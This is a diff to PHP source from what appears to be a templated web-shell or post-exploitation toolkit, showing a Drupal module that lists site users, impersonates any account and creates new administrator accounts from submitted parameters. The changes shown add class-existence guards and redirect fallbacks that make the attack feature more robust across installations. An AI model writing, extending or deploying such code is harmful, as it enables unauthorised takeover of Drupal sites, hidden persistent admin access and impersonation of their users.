@@ -15,15 +15,19 @@ $IMPERSONATE_DRUPAL_USER = "__FEAT_IMPERSONATE_DRUPAL_USER__";
  * @param $css string The CSS of the page
  */
 function __PREFIX__makeDrupalImpersonatePage(&$page_content, $features, $page, $css) {
+    $feature = array_values(array_filter($features, function ($feature) use ($page) {
+        return $feature["op"] === $page;
+    }));
+
     $users        = __PREFIX__getDrupalUsers();
     $page_content = __PREFIX__makePage(
         $features,
-        $page,
         $css,
+        $page,
         array(
             __PREFIX__makePageHeader(
-                $features[$page]["title"],
-                $features[$page]["description"]
+                $feature[0]["title"],
+                $feature[0]["description"]
             ),
             __PREFIX__makeTable(
                 "Users",
@@ -97,6 +101,11 @@ function __PREFIX__makeDrupalImpersonatePage(&$page_content, $features, $page, $
 function __PREFIX__getDrupalUsers() {
     global $IMPERSONATE_DRUPAL_USER;
 
+    if(!class_exists("Drupal\user\Entity\Role") || !class_exists("Drupal\user\Entity\User") ||
+       !class_exists("Drupal")) {
+        return array();
+    }
+
     // Load all user roles.
     $roles = \Drupal\user\Entity\Role::loadMultiple();
     // Get all permissions.
@@ -163,6 +172,16 @@ function __PREFIX__getDrupalUsers() {
  * @param $username string Username of the user to impersonate
  */
 function __PREFIX__impersonateDrupalUser($id) {
+    if(!class_exists("Drupal\user\Entity\User") || !class_exists("Drupal") ||
+       !class_exists("Drupal\Component\Utility\Crypt")) {
+        if(!class_exists("Symfony\Component\HttpFoundation\RedirectResponse")) {
+            header("Location: " . $_SERVER['REQUEST_URI']);
+            return;
+        }
+
+        return new \Symfony\Component\HttpFoundation\RedirectResponse($_SERVER['REQUEST_URI']);
+    }
+
     // Load the user by username.
     $user = \Drupal\user\Entity\User::load($id);
 
@@ -226,6 +245,11 @@ function __PREFIX__impersonateDrupalUser($id) {
  * @param $password string The password for the new user.
  */
 function __PREFIX__addDrupalAdministratorUser($username, $email, $password) {
+    if(!class_exists("Drupal\user\Entity\Role") || !class_exists("Drupal\user\Entity\User") ||
+       !class_exists("Drupal")) {
+        return;
+    }
+
     // Load the user roles.
     $roles = \Drupal\user\Entity\Role::loadMultiple();
 
@@ -277,6 +301,11 @@ function __PREFIX__handleDrupalImpersonate($operation, $features) {
             $_POST["__PARAM_3__"],
             $_POST["__PARAM_4__"]
         );
+
+        if(!class_exists("Symfony\Component\HttpFoundation\RedirectResponse")) {
+            header("Location: " . $_SERVER['REQUEST_URI']);
+            return;
+        }
 
         return new \Symfony\Component\HttpFoundation\RedirectResponse($_SERVER["REQUEST_URI"]);
     }
